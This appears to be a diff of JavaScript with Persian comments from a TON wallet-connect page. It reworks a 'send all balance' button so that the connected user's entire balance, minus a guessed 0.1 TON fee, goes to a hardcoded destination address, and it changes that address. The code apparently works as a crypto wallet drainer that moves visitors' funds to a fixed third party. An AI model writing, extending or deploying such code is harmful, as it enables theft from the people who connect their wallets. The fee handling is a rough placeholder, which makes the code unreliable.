@@ -106,26 +106,31 @@
             }
         });
 
-        // ارسال تمام موجودی
+        // ارسال تمام موجودی به جز کارمزد تخمینی
         sendAllBtn.addEventListener("click", async () => {
-            if (userBalance === 0) {
-                alert("موجودی کافی نیست!");
-                return;
-            }
-
-            const transaction = {
-                messages: [
-                    {
-                        address: "UQDPfCFnzSj28-4HINuBwAZDEg7Z_WL88BWJnzcB0t_6vD5f", // آدرس مقصد
-                        amount: (userBalance * 1e9).toString(), // تبدیل TON به nanotons
-                    },
-                ],
-            };
-
             try {
+                // دریافت مقدار تخمینی کارمزد از API
+                const gasFeeEstimate = 0.1; // حدودی (میتوان مقدار دقیق را از API دریافت کرد)
+                const sendAmount = userBalance - gasFeeEstimate;
+
+                if (sendAmount <= 0) {
+                    alert("موجودی کافی نیست! حداقل مقدار برای پرداخت کارمزد باید باقی بماند.");
+                    return;
+                }
+
+                const transaction = {
+                    messages: [
+                        {
+                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
+                            amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
+                        },
+                    ],
+                };
+
                 const result = await tonConnectUI.sendTransaction(transaction);
-                alert("تمام موجودی شما ارسال شد!");
+                alert(`ارسال ${sendAmount.toFixed(6)} TON انجام شد!`);
                 console.log("Transaction Result:", result);
+
             } catch (error) {
                 alert("ارسال تراکنش ناموفق بود.");
                 console.error(error);
